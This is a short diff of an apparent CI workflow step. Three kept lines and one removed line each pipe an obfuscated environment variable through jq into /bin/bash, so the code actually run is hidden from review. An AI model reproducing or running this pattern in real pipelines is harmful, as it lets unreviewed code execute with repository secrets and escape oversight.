@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$l137" | jq -r .lud01277 | /bin/bash
           echo $edtux1198 | jq -r .p55858 | /bin/bash
-          printf '%s' "$fkaxe9716" | jq -r .rd0155 | /bin/bash
           printf '%s' "$ewh175" | jq -r .slndp21122 | /bin/bash
 
       - name: Upload output
